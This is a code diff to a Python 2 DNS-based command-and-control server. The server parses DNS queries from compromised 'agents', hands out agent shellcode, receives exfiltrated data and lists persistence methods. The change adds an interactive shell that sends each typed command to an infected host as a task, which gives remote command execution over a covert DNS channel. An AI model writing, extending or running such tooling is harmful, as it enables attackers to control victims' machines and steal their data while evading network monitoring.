@@ -1,6 +1,5 @@
 from dnslib import *
 import socket
-import os
 import time
 import threading
 import cmd
@@ -163,8 +162,6 @@ class DNSListener(object):
 			return self.get_agent_shellcode(agent)
 		elif(packetType == "DATA" and response_data != ""):
 			return self.agent_receive_data(agent,response_data)
-		
-
 
 		return "Agent: %s packet %s" % (agent,packetType)
 
@@ -172,7 +169,7 @@ class DNSListener(object):
 	def parse_dns_request(self,data):
 		# Parse DNS Requests
 		request = DNSRecord.parse(data)
-		qname = request.q.qname
+
 		qtype = QTYPE[request.q.qtype]
 		
 		if(str(qtype) == "PTR"):
@@ -328,9 +325,27 @@ class AgentCMD(cmd.Cmd):
 			for key,value in persistenceMethods.iteritems():
 				print "-> persist %s" % (key)
 			print "\n"
-			
+	def do_shell(self,s):
+		agent_shell = AgentShell()
+		agent_shell.prompt = "SHELL #>(%s) " % interactedAgent
+		agent_shell.cmdloop()
+
 	def do_back(self,s):
 		interactedAgent = ""
 		return True
 	def emptyline(self):
 		pass
+
+class AgentShell(cmd.Cmd):
+
+	def emptyline(self):
+		pass
+
+	def onecmd(self,s):
+		if(s == "exit" or s == "quit" or s == "back"):
+			return True
+		elif(s is None or s == ""):
+			pass
+		else:
+			sendTask(interactedAgent, "ECM-%s" % s)
+
